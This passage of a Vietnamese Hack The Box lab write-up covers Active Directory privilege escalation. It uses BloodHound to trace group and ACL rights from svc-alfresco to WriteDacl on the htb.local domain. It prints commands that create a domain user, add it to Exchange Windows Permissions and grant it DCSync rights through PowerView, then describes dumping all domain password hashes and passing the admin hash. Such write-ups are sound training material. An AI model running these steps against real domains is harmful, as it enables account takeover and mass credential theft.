+<p><img   src="https://i.imgur.com/JtEnp0S.png" ></p>
+<p>Tiếp theo cần chạy <code>SharpHound.exe</code> trên máy đã điều khiển được để extract tất cả thông tin cần thiết cho BloodHound.</p>
+<p>Để chuyển file từ máy host vào <code>evil-winrm</code> shell thì ta có thể host 1 python server để có thể chia sẻ file.</p>
+<p><img   src="https://i.imgur.com/rdDhXTW.png" ></p>
+<p>Tiếp theo ở máy nạn nhân ta sẽ download file thông qua cách sau.</p>
+<p><img   src="https://i.imgur.com/v5j5quT.png" ></p>
+<p>Tiếp theo chạy file SharpHound để tiến hành extract Active Directory info.</p>
+<p><img   src="https://i.imgur.com/MbP9WoK.png" ></p>
+<p><img   src="https://i.imgur.com/dfzszOh.png" ></p>
+<p>Tiếp theo tiến hành download file zip này về máy host.</p>
+<p><img   src="https://i.imgur.com/tBnpesU.png" ></p>
+<p>Tiến hành chạy BloodHound và upload file zip vừa tải về.</p>
+<p><img   src="https://i.imgur.com/ExOzi2Y.png" ></p>
+<p>Hiển thị như này là đã upload thành công. Tiếp theo tiến hành tìm node <code>svc-alfresco</code> và đánh dấu <code>owned</code>.</p>
+<p><img   src="https://i.imgur.com/CAA5I4k.png" ></p>
+<p>Tiếp theo ta tiến hành truy vấn lần lượt như sau</p>
+<p><img   src="https://i.imgur.com/czqIVct.png" ></p>
+<p><img   src="https://i.imgur.com/7PkY4bI.png" ></p>
+<p><img   src="https://i.imgur.com/rxMO5F9.png" ></p>
+<p>Từ đây có thể rút ra được kết luận sau:</p>
+<ul>
+<li><code>svc-alfresco</code> là member của group <code>Service Accounts</code></li>
+<li><code>Service Accounts</code> là member của group <code>Privileged IT Accounts</code></li>
+<li><code>Privileged IT Accounts</code> là member của <code>Account Operators</code></li>
+<li><code>Account Operators</code> group có GenericAll permission đối với <code>Exchange Windows Permissions</code></li>
+<li><code>Exchange Windows Permissions</code> group có <code>WriteDacl</code> permissions với domain <code>htb.local</code>.</li>
+</ul>
+<p>Xâu chuỗi lại ta có thể xác định được như sau:</p>
+<ul>
+<li><code>svc-alfresco</code> đồng thời sẽ là member của 3 group bao gồm <code>Service Accounts</code>, <code>Privileged IT Accounts</code> và <code>Account Operators</code>.</li>
+<li>Follow theo <a class="link"   target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#account-operators" >document<i class="fas fa-external-link-alt"></i></a> của Microsoft, ta có thể thấy <code>Account Operators</code> group có khả năng cấp các đặc quyền tạo tài khoản có giới hạn cho người dùng. &rarr; Vậy user <code>svc-alfresco</code> hoàn toàn có thể tạo được các user khác ở domain này.</li>
+<li>Tiếp theo <code>Account Operators</code> có <code>GenericAll</code> permission đối với <code>Exchange Windows Permissions</code> group. Theo <a class="link"   target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/answers/questions/907503/genericall-acl-on-domain-admins-group#:~:text=Hi%20there%2C-,GenericAll%20means%20user%20with%20full%20permission%20and%20it%20is%20dangerous%20to%20provide%20this%20other%20than%20trusted%20group%20members.,-Domain%20Admin%20group" >tài liệu<i class="fas fa-external-link-alt"></i></a> thì quyền này đồng nghĩa với user <code>svc-alfresco</code> sẽ có full control của group <code>Exchange Windows Permissions</code> này.</li>
+<li>Kết hợp với việc <code>Exchange Windows Permission</code> group có <code>WriteDacl</code> permission trên domain <code>htb.local</code>. Theo <a class="link"   target="_blank" rel="noopener" href="https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces#:~:text=WriteDACL%20%2D%20modify%20object%27s%20ACEs%20and%20give%20attacker%20full%20control%20right%20over%20the%20object" >tài liệu<i class="fas fa-external-link-alt"></i></a> thì với quyền này user có thể chỉnh sửa DACL (Discretionary Access Control List) của domain.</li>
+<li>Theo <a class="link"   target="_blank" rel="noopener" href="https://support.bloodhoundenterprise.io/hc/en-us/articles/17312765477787-WriteDacl#:~:text=Domains-,With%20WriteDACL%20against%20a%20domain%20object%2C%20grant%20yourself%20the%20ability%20to%20DCSync%3A,-Add%2DDomainObjectAcl" >BloodHound<i class="fas fa-external-link-alt"></i></a>, với quyền thì ta có thể khai thác thông qua DCSync Attack nhằm replicate domain và dump tất cả password hashes của domain.</li>
+</ul>
+<p>Tóm lại ta sẽ có attack path như sau:</p>
+<ul>
+<li>Đầu tiên, tạo 1 user thuộc domain, vì <code>svc-alfresco</code> là member của group <code>Account Operators</code> nên điều này hoàn toàn khả thi.</li>
+<li>Tiếp theo ta sẽ thêm user này vào <code>Exchange Windows Permission</code> group. Vì <code>svc-alfresco</code> có <code>GenericAll</code> permissions của <code>Exchange Windows Permissions</code> group nên điều này cũng khả thi.</li>
+<li>Tiếp theo ta sẽ cấp <code>DcSync privileges</code> cho user vừa tạo. Vì <code>Exchange Windows Permissions</code> group có  <code>WriteDacl</code> permission thuộc <code>htb.local</code> domain nên điều này cũng khả thi.</li>
+<li>Tiếp theo ta sẽ thực hiện DcSync attack để có thể dump toàn bộ password hashes của tất cả users thuộc domain.</li>
+<li>Và cuối cùng ta sẽ login thông qua WinRM với hashed password của admin vừa dump được.</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">net user dcduc password /add /domain <span class="comment"># Create user on domain</span></span><br><span class="line">net <span class="built_in">users</span> /domain <span class="comment"># Confirm that user created</span></span><br><span class="line">net group <span class="string">&quot;Exchange Windows Permissions&quot;</span> /add dcduc <span class="comment"># Add the user to &quot;Exchange Windows Permission&quot; group</span></span><br><span class="line">net user dcduc <span class="comment"># Confirm user added to group</span></span><br></pre></td></tr></table></figure>
+
+<p><img   src="https://i.imgur.com/X1vSOwY.png" ></p>
+<p><img   src="https://i.imgur.com/KZpiKvB.png" ></p>
+<p>Để cấp DCSync privileges cho user <code>dcduc</code> ta sẽ sử dụng <a class="link"   target="_blank" rel="noopener" href="https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1" >Powerview<i class="fas fa-external-link-alt"></i></a> script thuộc bộ <code>PowerSploit</code> (Lưu ý: Sử dụng dev branch).</p>
+<p><img   src="https://i.imgur.com/ymLLfCp.png" ></p>
+<p><img   src="https://i.imgur.com/8NLO5oB.png" ></p>
+<p>Tiếp theo ta sẽ sử dụng suggested command từ BloodHound để cấp DCSync privileges cho user.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$pass</span> = convertto-securestring <span class="string">&#x27;password&#x27;</span> -AsPlainText -Force</span><br><span class="line"><span class="variable">$cred</span> = New-Object System.Management.Automation.PSCredential(<span class="string">&#x27;htb.local\dcduc&#x27;</span>, <span class="variable">$pass</span>)</span><br><span class="line">Add-DomainObjectAcl -Credential <span class="variable">$cred</span> -TargetIdentity <span class="string">&quot;DC=htb,DC=local&quot;</span> -PrincipalIdentity dcduc -Rights DCSync</span><br></pre></td></tr></table></figure>
+
+<p><img   src="https://i.imgur.com/ZrA5hcV.png" ></p>
+<p>Và cuối cùng ta sử dụng script <code>secretdump.py</code> thuộc collection Impact Python để dump all password hashes.</p>
+<p><img   src="https://i.imgur.com/bEogIdR.png" ></p>
+<p>Cuối cùng sử dụng <code>evil-winrm</code> để login vào Admin account thông qua hash vừa tìm được. (Lưu ý: Ở đây sử dụng <code>-H</code> flag để truyền vào hash string thay vì <code>-p</code> với password)</p>
+<p><img   src="https://i.imgur.com/dw5Re5e.png" ></p>
+
+                    
+                </div>
+
+                
+
+                <div class="post-bottom-tags-and-share border-box">
+                    <div>
+                        
+                    </div>
+                    <div>
+                        
+                    </div>
+                </div>
+
+                
+
+                
+                    <div class="post-nav border-box">
+                        
+                        
+                            <div class="next-post">
+                                <a class="next"
+                                   rel="next"
+                                   href="/2024/10/29/htb-machine-sau/"
+                                   title="Machine: Sau"
+                                >
+                                    <span class="title flex-center">
+                                        <span class="post-nav-title-item text-ellipsis">Machine: Sau</span>
+                                        <span class="post-nav-item">Next posts</span>
+                                    </span>
+                                    <span class="right arrow-icon flex-center">
+                                        <i class="fas fa-chevron-right"></i>
+                                    </span>
+                                </a>
+                            </div>
+                        
+                    </div>
+                
+
+                
+                    
+
+
+
+
+
+
+                
+            </div>
+        </div>
+
+        
+            <div class="pc-post-toc right-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Machine-info"><span class="nav-number">1.</span> <span class="nav-text">Machine info</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Get-started"><span class="nav-number">2.</span> <span class="nav-text">Get started</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Recon"><span class="nav-number">2.1.</span> <span class="nav-text">Recon</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#nmap"><span class="nav-number">2.1.1.</span> <span class="nav-text">nmap</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Enumeration"><span class="nav-number">2.2.</span> <span class="nav-text">Enumeration</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#rpcclient"><span class="nav-number">2.2.1.</span> <span class="nav-text">rpcclient</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ldapsearch"><span class="nav-number">2.2.2.</span> <span class="nav-text">ldapsearch</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Keberos"><span class="nav-number">2.2.3.</span> <span class="nav-text">Keberos</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Crack-password"><span class="nav-number">2.3.</span> <span class="nav-text">Crack password</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#WinRM"><span class="nav-number">2.4.</span> <span class="nav-text">WinRM</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#User-flag"><span class="nav-number">2.5.</span> <span class="nav-text">User flag</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Privilege-Escalation"><span class="nav-number">2.6.</span> <span class="nav-text">Privilege Escalation</span></a></li></ol></li></ol>
+    </div>
+</div>
+
+            </div>
+        
+    </div>
+</div>
+
+
+                
+            </div>
+        </div>
+
+        <div class="page-main-content-bottom border-box">
+            
+<footer class="footer border-box">
+    <div class="copyright-info info-item">
+        &copy;&nbsp;<span>2023</span>&nbsp;-&nbsp;2024
+        
+            &nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;&nbsp;<a href="/">dcduc</a>
+        
+    </div>
+
+    <div class="theme-info info-item">
+        Powered by&nbsp;<a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;&&nbsp;Theme&nbsp;<a class="keep-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep</a>
+    </div>
+
+    
+
+    
+        <div class="count-info info-item">
+            
+
+            
+                <span class="count-item border-box uv">
+                    <span class="item-type border-box">Unique Visitor</span>
+                    <span class="item-value border-box uv" id="busuanzi_value_site_uv"></span>
+                </span>
+            
+
+            
+                <span class="count-item border-box pv">
+                    <span class="item-type border-box">Page View</span>
+                    <span class="item-value border-box pv" id="busuanzi_value_site_pv"></span>
+                </span>
+            
+        </div>
+    
+
+    
+</footer>
+
+        </div>
+    </div>
+
+    <!-- post tools -->
+    
+        <div class="post-tools right-toc">
+            <div class="post-tools-container border-box">
+    <ul class="post-tools-list border-box">
+        <!-- PC encrypt again -->
+        
+
+        <!-- PC TOC show toggle -->
+        
+            <li class="tools-item flex-center toggle-show-toc">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        <!-- PC go comment -->
+        
+
+        <!-- PC full screen -->
+        <li class="tools-item flex-center full-screen">
+            <i class="fa-solid fa-expand"></i>
+        </li>
+    </ul>
+</div>
+
+        </div>
+    
+
+    <!-- side tools -->
+    <div class="side-tools">
+        <div class="side-tools-container border-box ">
+    <ul class="side-tools-list side-tools-show-handle border-box">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <!-- toggle mode -->
+        
+            <li class="tools-item tool-toggle-theme-mode flex-center">
+                <i class="fas fa-moon"></i>
+            </li>
+        
+
+        <!-- rss -->
+        
+
+        <!-- to bottom -->
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list border-box">
+        
+            <li class="tools-item toggle-show-toc-tablet flex-center">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        
+
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+
+        <li class="tools-item tool-scroll-to-top flex-center show-arrow">
+            <i class="arrow fas fa-arrow-up"></i>
+            <span class="percent"></span>
+        </li>
+    </ul>
+</div>
+
+    </div>
+
+    <!-- image mask -->
+    <div class="zoom-in-image-mask">
+    <img class="zoom-in-image">
+</div>
+
+
+    <!-- local search -->
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="Search..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="close-popup-btn">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+    <!-- tablet toc -->
+    
+        <div class="tablet-post-toc-mask">
+            <div class="tablet-post-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Machine-info"><span class="nav-number">1.</span> <span class="nav-text">Machine info</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Get-started"><span class="nav-number">2.</span> <span class="nav-text">Get started</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Recon"><span class="nav-number">2.1.</span> <span class="nav-text">Recon</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#nmap"><span class="nav-number">2.1.1.</span> <span class="nav-text">nmap</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Enumeration"><span class="nav-number">2.2.</span> <span class="nav-text">Enumeration</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#rpcclient"><span class="nav-number">2.2.1.</span> <span class="nav-text">rpcclient</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ldapsearch"><span class="nav-number">2.2.2.</span> <span class="nav-text">ldapsearch</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Keberos"><span class="nav-number">2.2.3.</span> <span class="nav-text">Keberos</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Crack-password"><span class="nav-number">2.3.</span> <span class="nav-text">Crack password</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#WinRM"><span class="nav-number">2.4.</span> <span class="nav-text">WinRM</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#User-flag"><span class="nav-number">2.5.</span> <span class="nav-text">User flag</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Privilege-Escalation"><span class="nav-number">2.6.</span> <span class="nav-text">Privilege Escalation</span></a></li></ol></li></ol>
+    </div>
+</div>
+
+            </div>
+        </div>
+    
+</main>
+
+
+
+
+
+<!-- common js -->
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/header-shrink.js"></script>
+
+<script src="/js/back2top.js"></script>
+
+<script src="/js/toggle-theme.js"></script>
+
+<script src="/js/code-block.js"></script>
+
+<script src="/js/main.js"></script>
+
+<script src="/js/libs/anime.min.js"></script>
+
+
+<!-- local search -->
+
+    
+<script src="/js/local-search.js"></script>
+
+
+
+<!-- lazyload -->
+
+
+<div class="pjax">
+    <!-- home page -->
+    
+
+    <!-- post page -->
+    
+        <!-- post-helper -->
+        
+<script src="/js/post/post-helper.js"></script>
+
+
+        <!-- toc -->
+        
+            
+<script src="/js/post/toc.js"></script>
+
+        
+
+        <!-- copyright-info -->
+        
+
+        <!-- share -->
+        
+    
+
+    <!-- categories page -->
+    
+
+    <!-- links page -->
+    
+
+    <!-- photos page -->
+    
+
+    <!-- tools page -->
+    
+</div>
+
+<!-- mermaid -->
+
+
+<!-- pjax -->
+
+    
+<script src="/js/libs/pjax.min.js"></script>
+
+<script>
+    window.addEventListener('DOMContentLoaded', () => {
+        window.pjax = new Pjax({
+            selectors: [
+                'head title',
+                '.page-container',
+                '.pjax'
+            ],
+            history: true,
+            debug: false,
+            cacheBust: false,
+            timeout: 0,
+            analytics: false,
+            currentUrlFullReload: false,
+            scrollRestoration: false,
+        });
+
+        document.addEventListener('pjax:send', () => {
+            KEEP.utils.pjaxProgressBarStart()
+        });
+
+        document.addEventListener('pjax:complete', () => {
+            KEEP.utils.pjaxProgressBarEnd()
+            window.pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'))
+            KEEP.initExecute()
+        });
+    });
+</script>
+
+
+
+
+    
+        
+    
+
+</body>
+</html>
